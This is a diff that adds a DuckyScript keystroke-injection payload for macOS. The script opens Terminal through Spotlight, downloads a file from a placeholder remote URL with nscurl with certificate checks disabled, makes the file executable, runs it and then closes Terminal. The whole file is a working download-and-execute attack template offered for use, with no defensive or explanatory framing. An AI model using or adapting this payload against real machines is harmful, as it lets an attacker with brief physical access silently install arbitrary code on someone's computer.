@@ -1,0 +1,14 @@
+REM Downloades and executes a payload from an external url using nscurl
+DELAY 2000
+GUI space
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING "nscurl -k <remote_file_url> -o <filename>;"
+ENTER
+DELAY 500
+STRING "chmod +x <filename>;./<filename>"
+ENTER
+ENTER
+GUI q
